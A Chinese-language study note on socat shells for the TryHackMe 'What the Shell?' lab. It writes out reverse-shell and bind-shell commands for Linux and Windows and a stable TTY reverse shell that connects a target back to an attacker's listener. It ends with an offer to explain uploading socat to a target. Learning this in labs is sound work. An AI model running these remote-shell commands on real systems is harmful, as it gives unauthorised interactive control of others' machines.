> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag


## Socat Shell 技術筆記

## 1. 簡介

`Socat` 是一個強大的網路工具，可以看作是 `Netcat` 的進階版。它的基本原理是 **「在兩個點之間建立連接」**（就像《傳送門》遊戲中的 Portal Gun）。

- **連接點可以是：** 監聽連接埠、標準輸入 (STDIN)、檔案、甚至是兩個監聽連接埠。
    
- **主要優勢：** 能在 Linux 上實現極其穩定的全功能 TTY Reverse Shell。
    

---

## 2. 基礎Reverse Shell 

這種方式產生的 Shell 是**不穩定**的，效果等同於 `nc -lvnp`。

### **攻擊機（監聽端）**


```bash
socat TCP-L:<port> -
```

- `TCP-L:<port>`：開啟 TCP 監聽。
    
- `-`：代表將輸出連接到標準輸入（你的鍵盤）。
    

### **目標機（連回端）**

- **Windows:**
    
    
    ```powershell
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
    ```
    
    - `pipes`：強制 PowerShell 使用類 Unix 的標準輸入輸出。
        
- **Linux:**
    
    
    ```bash
    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
    ```
    

---

## 3. 基礎Bind Shell 

### **目標機（監聽端）**

- **Linux:** `socat TCP-L:<PORT> EXEC:"bash -li"`
    
- **Windows:** `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
    

### **攻擊機（連入端）**


```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

---

## 4. 進階：穩定的 Linux TTY Reverse Shell

這是 Socat 最強大的用法，能直接獲得一個支持 `Ctrl+C`、自動補全、且不會崩潰的 TTY。

### **步驟 1：攻擊機啟動特殊監聽器**


```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

- `FILE:`tty``：將當前終端 TTY 作為檔案傳入。
    
- `raw,echo=0`：這相當於 `stty raw -echo`，能讓你直接使用快捷鍵並穩定 Shell。
    

### **步驟 2：目標機執行特殊指令**

此指令要求目標機必須有 `socat` 二進制文件（可手動上傳編譯好的版本）。


```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

參數解析：

| 參數 | 功能描述 |
| --- | --- |
| pty | 在目標機分配一個偽終端 (pseudoterminal)，穩定化核心步驟。 |
| stderr | 確保錯誤訊息能正常顯示在 Shell 中。 |
| sigint | 轉發 Ctrl + C 到子進程（可終止 Shell 內的程式而非 Shell 本身）。 |
| setsid | 在新會話中建立進程。 |
| sane | 終端狀態「正常化」，協助穩定。 |

---

## 5. 疑難排解與調優

- **增加日誌：** 如果連線失敗，可以在指令中加入 `-d -d`（增加詳細程度）來除錯。
    
    - 範例：`socat -d -d TCP-L:4444 -`
        
- **調整終端大小：** 獲得穩定 Shell 後，仍建議配合 `stty rows` 與 `stty cols`（參考 Netcat 筆記）來對齊終端尺寸，以便使用 `Vim` 或 `Nano`。
    

---

## 總結：Socat vs Netcat

- **Netcat**：簡單、輕量，幾乎所有系統內建，但穩定化需要多個手動步驟。
    
- **Socat**：功能極強，能一步到位實現穩定 TTY，但語法複雜，且目標機通常需要額外上傳執行檔。
    

---

下一個步驟建議：

你想了解如何將 Socat 的二進制檔案靜態編譯並上傳到目標機的方法嗎？